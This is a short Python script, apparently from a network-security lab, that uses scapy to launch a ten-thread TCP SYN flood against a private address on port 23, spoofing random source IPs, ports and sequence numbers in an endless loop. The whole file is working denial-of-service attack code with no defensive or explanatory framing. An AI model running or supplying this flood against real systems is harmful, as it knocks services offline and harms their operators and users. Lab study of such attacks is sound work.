#!/bin/env python3

from scapy.all import IP, TCP, send
from ipaddress import IPv4Address
from random import getrandbits
import threading

def syn_flood(target_ip, target_port):
    ip = IP(dst=target_ip)
    tcp = TCP(dport=target_port, flags='S')
    pkt = ip/tcp

    while True:
        pkt[IP].src = str(IPv4Address(getrandbits(32)))  # Random source IP
        pkt[TCP].sport = getrandbits(16)                 # Random source port
        pkt[TCP].seq = getrandbits(32)                   # Random sequence number
        send(pkt, verbose=0)

if __name__ == "__main__":
    target_ip = "10.9.0.5"  #
    target_port = 23        # nmap 10.9.0.5

    # Define number of threads (instances)
    num_threads = 10

    # Create multiple threads
    threads = []
    for _ in range(num_threads):
        t = threading.Thread(target=syn_flood, args=(target_ip, target_port))
        threads.append(t)
        t.start()

    # Join threads (optional, to wait for completion)
    for t in threads:
        t.join()
